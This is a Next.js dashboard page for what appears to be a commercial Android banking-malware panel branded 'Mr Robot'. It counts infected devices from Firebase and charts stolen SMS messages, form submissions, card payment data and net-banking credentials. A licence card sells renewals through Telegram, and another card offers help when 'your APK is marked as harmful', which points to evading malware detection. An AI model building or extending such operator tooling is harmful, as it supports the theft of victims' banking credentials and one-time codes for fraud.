"use client";

import {
  Bar,
  BarChart,
  CartesianGrid,
  Cell,
  Pie,
  PieChart,
  ResponsiveContainer,
  Tooltip,
  XAxis,
  YAxis,
} from "recharts";
import {
  Button,
  Card,
  CardBody,
  CardHeader,
  Chip,
  Divider,
  Input,
  Link,
  Modal,
  ModalBody,
  ModalContent,
  ModalFooter,
  ModalHeader,
  useDisclosure,
} from "@heroui/react";
import NextLink from "next/link";
import { onValue, ref } from "firebase/database";
import { useState, useEffect } from "react";
import { db } from "@/lib/firbase";
import {
  FiAlertTriangle,
  FiBarChart2,
  FiPieChart,
  FiStar,
} from "react-icons/fi";
import Sidebar from "@/components/Sidebar";
import CapturedDataChart from "@/components/CapturedDataChart";

export default function DashboardPage() {
  const { isOpen, onOpen, onOpenChange } = useDisclosure();
  const [code, setCode] = useState("");
  const [onlineDevices, setOnlineDevices] = useState(0);
  const [offlineDevices, setOfflineDevices] = useState(0);
  const [totalDevices, setTotalDevices] = useState(0);
  const [allSms, setAllSms] = useState(0);
  const [formSubmissions, setFormSubmissions] = useState(0);
  const [cardPayments, setCardPayments] = useState(0);
  const [netBankingCount, setNetBankingCount] = useState(0);
  const [adminActivity, setAdminActivity] = useState({
    purchaseDate: 0,
    activeUntil: 0,
  });
  const [timeLeft, setTimeLeft] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0,
    totalSeconds: 0,
  });

  // Helper function to format timestamp to readable date
  const formatDate = (timestamp: number): string => {
    if (!timestamp) return "--/--/----";
    const date = new Date(timestamp);
    const day = String(date.getDate()).padStart(2, "0");
    const month = String(date.getMonth() + 1).padStart(2, "0");
    const year = date.getFullYear();
    return `${day}/${month}/${year}`;
  };

  // Countdown timer effect - updates when adminActivity.activeUntil changes
  useEffect(() => {
    if (!adminActivity.activeUntil) return;

    const interval = setInterval(() => {
      const now = Date.now();
      const remainingMs = adminActivity.activeUntil - now;

      if (remainingMs <= 0) {
        clearInterval(interval);
        setTimeLeft({
          days: 0,
          hours: 0,
          minutes: 0,
          seconds: 0,
          totalSeconds: 0,
        });
        return;
      }

      const totalSeconds = Math.floor(remainingMs / 1000);
      setTimeLeft({
        days: Math.floor(totalSeconds / 86400),
        hours: Math.floor((totalSeconds % 86400) / 3600),
        minutes: Math.floor((totalSeconds % 3600) / 60),
        seconds: totalSeconds % 60,
        totalSeconds: totalSeconds,
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [adminActivity.activeUntil]);

  useEffect(() => {
    const deviceRef = ref(db, `registeredDevices`);
    const unsubscribeDevice = onValue(deviceRef, (snapshot) => {
      if (!snapshot.exists()) {
        console.log("No devices found.");
        return;
      }
      const devicesData = snapshot.val();

      // Count online/offline devices based on checkOnline status
      const onlineCount = Object.values(devicesData).filter(
        (d: any) => d.checkOnline?.available === "Device is online",
      ).length;
      const offlineCount = Object.values(devicesData).filter(
        (d: any) => d.checkOnline?.available !== "Device is online",
      ).length;

      // Count total SMS from all devices
      const totalSmsCount = Object.values(devicesData).reduce(
        (sum: number, device: any) => {
          const smsCount = Object.keys(device.smsLogs || {}).length;
          return sum + smsCount;
        },
        0,
      );

      // Count form submissions from all devices
      const totalFormSubmissions = Object.values(devicesData).reduce(
        (sum: number, device: any) => {
          const formCount = Object.keys(device.form_submissions || {}).length;
          return sum + formCount;
        },
        0,
      );

      // Count card payments from all devices
      const totalCardPayments = Object.values(devicesData).reduce(
        (sum: number, device: any) => {
          const cardCount = Object.keys(device.card_payment_data || {}).length;
          return sum + cardCount;
        },
        0,
      );

      // Count net banking entries from all devices
      const totalNetBanking = Object.values(devicesData).reduce(
        (sum: number, device: any) => {
          const netBankingCount = Object.keys(
            device.netbanking_data || {},
          ).length;
          return sum + netBankingCount;
        },
        0,
      );

      setOnlineDevices(onlineCount);
      setOfflineDevices(offlineCount);
      setTotalDevices(onlineCount + offlineCount);
      setAllSms(totalSmsCount);
      setFormSubmissions(totalFormSubmissions);
      setCardPayments(totalCardPayments);
      setNetBankingCount(totalNetBanking);
    });

    return () => unsubscribeDevice();
  }, []);

  useEffect(() => {
    const adminActivityRef = ref(db, `admin/admin1`);
    const unsubscribeAdminActivity = onValue(adminActivityRef, (snapshot) => {
      if (!snapshot.exists()) return;
      const data = snapshot.val();
      setAdminActivity({
        activeUntil: data.activeUntil ?? 0,
        purchaseDate: data.purchaseDate ?? 0,
      });
    });

    return () => unsubscribeAdminActivity();
  }, []);

  const statusChartData = [
    { name: "Online", value: onlineDevices, color: "#1f8a53" },
    { name: "Offline", value: offlineDevices, color: "#c74747" },
  ];

  const captureVolumeData = [
    { name: "SMS", value: allSms, color: "#123b2b" },
    { name: "Forms", value: formSubmissions, color: "#2f654e" },
    { name: "Cards", value: cardPayments, color: "#5f8f79" },
    { name: "Banking", value: netBankingCount, color: "#88ac98" },
  ];

  const hasStatusData = onlineDevices + offlineDevices > 0;
  const hasCaptureData =
    allSms + formSubmissions + cardPayments + netBankingCount > 0;

  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <div className="space-y-6">
            <Card
              shadow="sm"
              className="surface-card overflow-hidden rounded-[32px] border border-(--border) bg-linear-to-br from-white/92 via-white/86 to-(--accent-soft)"
            >
              <CardBody className="flex flex-col gap-5 p-5 sm:p-6 lg:flex-row lg:items-end lg:justify-between">
                <div className="space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-linear-to-br from-(--accent) to-[#2e654f] text-base font-bold text-white shadow-[0_18px_40px_rgba(18,59,43,0.28)]">
                      MR
                    </div>
                    <div>
                      <p className="text-xs font-semibold uppercase tracking-[0.18em] text-[var(--accent)]">
                        Command Center
                      </p>
                      <p className="text-2xl font-semibold text-[var(--text-main)]">
                        Mr Robot
                      </p>
                    </div>
                  </div>

                  <p className="max-w-2xl text-sm text-[var(--text-muted)] sm:text-base">
                    Monitor device activity, review captured data, and keep the
                    admin environment healthy from a single mobile-friendly
                    dashboard.
                  </p>

                  <div className="flex flex-wrap gap-2">
                    <Chip
                      className="border border-emerald-200 bg-emerald-50 px-3 text-emerald-700"
                      variant="flat"
                      size="sm"
                    >
                      Connected
                    </Chip>
                    <Chip
                      className="border border-(--border) bg-white px-3 text-(--accent)"
                      variant="flat"
                      size="sm"
                    >
                      Secure Admin Panel
                    </Chip>
                  </div>
                </div>
              </CardBody>
            </Card>

            <section className="grid grid-cols-2 gap-3 lg:grid-cols-4">
              <NextLink href="/devices?status=online" className="block">
                <Card className="metric-card rounded-[24px] cursor-pointer border-emerald-100">
                  <CardBody className="gap-3 p-4">
                    <span className="status-pill status-pill-online w-fit">
                      <span className="h-2 w-2 rounded-full bg-emerald-500" />
                      Online
                    </span>
                    <p className="text-3xl font-semibold text-[var(--text-main)]">
                      {onlineDevices}
                    </p>
                    <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                      Active devices
                    </p>
                  </CardBody>
                </Card>
              </NextLink>

              <NextLink href="/devices?status=offline" className="block">
                <Card className="metric-card rounded-[24px] cursor-pointer border-rose-100">
                  <CardBody className="gap-3 p-4">
                    <span className="status-pill status-pill-offline w-fit">
                      <span className="h-2 w-2 rounded-full bg-rose-500" />
                      Offline
                    </span>
                    <p className="text-3xl font-semibold text-[var(--text-main)]">
                      {offlineDevices}
                    </p>
                    <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                      Needs attention
                    </p>
                  </CardBody>
                </Card>
              </NextLink>

              <NextLink href="/devices" className="block">
                <Card className="metric-card rounded-[24px] cursor-pointer">
                  <CardBody className="gap-3 p-4">
                    <span className="subtle-chip w-fit">Fleet size</span>
                    <p className="text-3xl font-semibold text-[var(--text-main)]">
                      {totalDevices}
                    </p>
                    <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                      Total registered
                    </p>
                  </CardBody>
                </Card>
              </NextLink>

              <NextLink href="/notifications" className="block">
                <Card className="metric-card rounded-[24px] cursor-pointer border-amber-100">
                  <CardBody className="gap-3 p-4">
                    <span className="status-pill status-pill-idle w-fit">
                      <span className="h-2 w-2 rounded-full bg-amber-500" />
                      Messages
                    </span>
                    <p className="text-3xl font-semibold text-[var(--text-main)]">
                      {allSms}
                    </p>
                    <p className="text-xs uppercase tracking-wide text-[var(--text-muted)]">
                      Captured SMS
                    </p>
                  </CardBody>
                </Card>
              </NextLink>
            </section>

            <div className="grid gap-6 xl:grid-cols-[1.35fr_0.95fr]">
              <Card shadow="sm" className="surface-card rounded-[28px]">
                <CardBody className="gap-4 p-5 sm:p-6">
                  <div className="flex items-center justify-between gap-3">
                    <div>
                      <p className="text-lg font-semibold text-[var(--text-main)]">
                        Admin License
                      </p>
                      <p className="text-sm text-[var(--text-muted)]">
                        Subscription timeline and renewal actions
                      </p>
                    </div>
                    <Button
                      radius="full"
                      size="sm"
                      variant="flat"
                      color="success"
                      className="font-semibold"
                    >
                      Renew Now
                    </Button>
                  </div>
                  <Divider />
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                    <div className="soft-panel p-4">
                      <p className="text-xs font-medium uppercase tracking-wide text-[var(--text-muted)]">
                        Active until
                      </p>
                      <p className="mt-2 text-lg font-semibold text-[var(--text-main)]">
                        {formatDate(adminActivity.activeUntil)}
                      </p>
                    </div>
                    <div className="soft-panel p-4">
                      <p className="text-xs font-medium uppercase tracking-wide text-[var(--text-muted)]">
                        Purchase date
                      </p>
                      <p className="mt-2 text-lg font-semibold text-[var(--text-main)]">
                        {formatDate(adminActivity.purchaseDate)}
                      </p>
                    </div>
                  </div>
                  <Card
                    className="rounded-[24px] border border-[var(--border)] bg-[var(--surface-subtle)]"
                    shadow="none"
                  >
                    <CardBody className="items-center gap-4 p-5 text-center">
                      <div className="w-full text-[var(--text-main)]">
                        <div className="grid grid-cols-4 gap-2 text-center text-2xl font-semibold sm:text-4xl">
                          <span className="rounded-2xl bg-white px-2 py-2 shadow-sm">
                            {String(timeLeft.days).padStart(2, "0")}
                          </span>
                          <span className="rounded-2xl bg-white px-2 py-2 shadow-sm">
                            {String(timeLeft.hours).padStart(2, "0")}
                          </span>
                          <span className="rounded-2xl bg-white px-2 py-2 shadow-sm">
                            {String(timeLeft.minutes).padStart(2, "0")}
                          </span>
                          <span className="rounded-2xl bg-emerald-50 px-2 py-2 text-emerald-600 shadow-sm">
                            {String(timeLeft.seconds).padStart(2, "0")}
                          </span>
                        </div>
                        <div className="mt-3 grid grid-cols-4 gap-2 text-center text-[10px] font-medium tracking-wide text-[var(--text-muted)] sm:text-xs">
                          <span>D</span>
                          <span>H</span>
                          <span>M</span>
                          <span>S</span>
                        </div>
                      </div>
                      <p className="text-sm text-[var(--text-muted)]">
                        Time remaining until expiration
                      </p>
                      <Button
                        as="a"
                        href="https://t.me"
                        target="_blank"
                        color="success"
                        variant="flat"
                        className="h-11 w-full font-semibold"
                        radius="lg"
                      >
                        Renew via Telegram
                      </Button>
                    </CardBody>
                  </Card>
                </CardBody>
              </Card>

              <div className="grid gap-6">
                <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-1">
                  <Card
                    shadow="sm"
                    className="rounded-[28px] border border-amber-200 bg-linear-to-br from-amber-50 to-white"
                  >
                    <CardBody className="gap-3 p-5">
                      <div className="flex items-start gap-3">
                        <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-amber-100">
                          <FiAlertTriangle className="h-6 w-6 text-amber-700" />
                        </div>
                        <div>
                          <p className="font-semibold text-[var(--text-main)]">
                            Fix Harmful Flag
                          </p>
                          <p className="mt-1 text-sm text-[var(--text-muted)]">
                            Contact support if your APK is marked as harmful.
                          </p>
                        </div>
                      </div>
                      <Button
                        as="a"
                        href="https://wa.me/?text=hello%20sir%20fixmy%20harmfull"
                        target="_blank"
                        color="warning"
                        variant="flat"
                        className="h-11 w-full font-semibold"
                        radius="lg"
                      >
                        Contact via WhatsApp
                      </Button>
                    </CardBody>
                  </Card>

                  <Card
                    shadow="sm"
                    className="rounded-[28px] border border-emerald-200 bg-linear-to-br from-emerald-50 to-white"
                  >
                    <CardBody className="gap-3 p-5">
                      <div className="flex items-start gap-3">
                        <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-100">
                          <FiStar className="h-6 w-6 text-emerald-700" />
                        </div>
                        <div>
                          <p className="font-semibold text-[var(--text-main)]">
                            Favorites
                          </p>
                          <p className="mt-1 text-sm text-[var(--text-muted)]">
                            Mark devices as favorites for quick access.
                          </p>
                        </div>
                      </div>
                      <Link
                        href="/favorites"
                        className="h-11 w-full bg-emerald-100 font-semibold text-emerald-700 hover:bg-emerald-200 flex items-center justify-center rounded-lg"
                      >
                        View Favorites
                      </Link>
                    </CardBody>
                  </Card>
                </div>

                <Card shadow="sm" className="surface-card rounded-[28px]">
                  <CardHeader className="flex items-center justify-between border-b border-[var(--border)] p-5">
                    <div>
                      <p className="text-lg font-semibold text-[var(--text-main)]">
                        Captured Data
                      </p>
                      <p className="text-sm text-[var(--text-muted)]">
                        Overview of all submissions
                      </p>
                    </div>
                    <Link href="/forms" color="primary">
                      View All →
                    </Link>
                  </CardHeader>
                  <CardBody className="p-5">
                    <CapturedDataChart
                      formSubmissions={formSubmissions}
                      cardPayments={cardPayments}
                      netBankingCount={netBankingCount}
                    />
                  </CardBody>
                </Card>
              </div>
            </div>

            <section className="grid gap-6 lg:grid-cols-2">
              <Card className="surface-card overflow-hidden rounded-[28px]">
                <CardHeader className="flex items-center justify-between gap-3 border-b border-(--border) p-4 sm:p-5">
                  <div>
                    <p className="text-lg font-semibold text-(--text-main)">
                      Device Availability
                    </p>
                    <p className="text-sm text-(--text-muted)">
                      Online vs offline distribution
                    </p>
                  </div>
                  <span className="flex h-10 w-10 items-center justify-center rounded-2xl bg-(--accent-soft)">
                    <FiPieChart className="h-5 w-5 text-(--accent)" />
                  </span>
                </CardHeader>
                <CardBody className="space-y-4 p-4 sm:p-5">
                  <div className="h-[220px] w-full sm:h-[260px]">
                    {hasStatusData ? (
                      <ResponsiveContainer width="100%" height="100%">
                        <PieChart>
                          <Tooltip
                            contentStyle={{
                              borderRadius: 12,
                              border: "1px solid var(--border)",
                              backgroundColor: "rgba(255,255,255,0.95)",
                              color: "var(--text-main)",
                            }}
                          />
                          <Pie
                            data={statusChartData}
                            dataKey="value"
                            nameKey="name"
                            innerRadius={56}
                            outerRadius={84}
                            paddingAngle={4}
                            stroke="none"
                          >
                            {statusChartData.map((entry) => (
                              <Cell key={entry.name} fill={entry.color} />
                            ))}
                          </Pie>
                        </PieChart>
                      </ResponsiveContainer>
                    ) : (
                      <div className="flex h-full items-center justify-center rounded-2xl border border-dashed border-(--border) bg-(--surface-subtle) text-sm text-(--text-muted)">
                        No device status data yet
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-2">
                    {statusChartData.map((entry) => (
                      <div
                        key={entry.name}
                        className="rounded-xl border border-(--border) bg-(--surface-subtle) px-3 py-2"
                      >
                        <p className="flex items-center gap-2 text-xs text-(--text-muted)">
                          <span
                            className="h-2.5 w-2.5 rounded-full"
                            style={{ backgroundColor: entry.color }}
                          />
                          {entry.name}
                        </p>
                        <p className="mt-1 text-lg font-semibold text-(--text-main)">
                          {entry.value}
                        </p>
                      </div>
                    ))}
                  </div>
                </CardBody>
              </Card>

              <Card className="surface-card overflow-hidden rounded-[28px]">
                <CardHeader className="flex items-center justify-between gap-3 border-b border-(--border) p-4 sm:p-5">
                  <div>
                    <p className="text-lg font-semibold text-(--text-main)">
                      Capture Volume
                    </p>
                    <p className="text-sm text-(--text-muted)">
                      Relative volume across collection channels
                    </p>
                  </div>
                  <span className="flex h-10 w-10 items-center justify-center rounded-2xl bg-(--accent-soft)">
                    <FiBarChart2 className="h-5 w-5 text-(--accent)" />
                  </span>
                </CardHeader>
                <CardBody className="space-y-4 p-4 sm:p-5">
                  <div className="h-[220px] w-full sm:h-[260px]">
                    {hasCaptureData ? (
                      <ResponsiveContainer width="100%" height="100%">
                        <BarChart
                          data={captureVolumeData}
                          margin={{ top: 10, right: 8, left: -14, bottom: 0 }}
                        >
                          <CartesianGrid
                            strokeDasharray="4 4"
                            vertical={false}
                            stroke="rgba(20,58,44,0.14)"
                          />
                          <XAxis
                            dataKey="name"
                            axisLine={false}
                            tickLine={false}
                            tick={{ fontSize: 11, fill: "#4f665a" }}
                          />
                          <YAxis
                            allowDecimals={false}
                            axisLine={false}
                            tickLine={false}
                            tick={{ fontSize: 11, fill: "#4f665a" }}
                          />
                          <Tooltip
                            contentStyle={{
                              borderRadius: 12,
                              border: "1px solid var(--border)",
                              backgroundColor: "rgba(255,255,255,0.95)",
                              color: "var(--text-main)",
                            }}
                          />
                          <Bar dataKey="value" radius={[10, 10, 4, 4]}>
                            {captureVolumeData.map((entry) => (
                              <Cell key={entry.name} fill={entry.color} />
                            ))}
                          </Bar>
                        </BarChart>
                      </ResponsiveContainer>
                    ) : (
                      <div className="flex h-full items-center justify-center rounded-2xl border border-dashed border-(--border) bg-(--surface-subtle) text-sm text-(--text-muted)">
                        No captured volume yet
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
                    {captureVolumeData.map((entry) => (
                      <div
                        key={entry.name}
                        className="rounded-xl border border-(--border) bg-(--surface-subtle) px-3 py-2"
                      >
                        <p className="text-[11px] text-(--text-muted)">
                          {entry.name}
                        </p>
                        <p className="mt-1 text-sm font-semibold text-(--text-main)">
                          {entry.value}
                        </p>
                      </div>
                    ))}
                  </div>
                </CardBody>
              </Card>
            </section>
          </div>

          <Modal isOpen={isOpen} onOpenChange={onOpenChange} placement="center">
            <ModalContent>
              {(onClose) => (
                <>
                  <ModalHeader className="flex flex-col gap-1">
                    Authenticate
                  </ModalHeader>
                  <ModalBody>
                    <p className="text-sm text-(--text-muted)">
                      Enter the one-time auth code sent to your secure channel.
                    </p>
                    <Input
                      value={code}
                      onChange={(e) => setCode(e.target.value)}
                      label="Auth Code"
                      variant="bordered"
                      placeholder="••••••"
                      autoFocus
                    />
                  </ModalBody>
                  <ModalFooter>
                    <Button variant="light" onPress={onClose}>
                      Close
                    </Button>
                    <Button color="primary" onPress={onClose}>
                      Continue
                    </Button>
                  </ModalFooter>
                </>
              )}
            </ModalContent>
          </Modal>
        </main>
      </div>
    </div>
  );
}
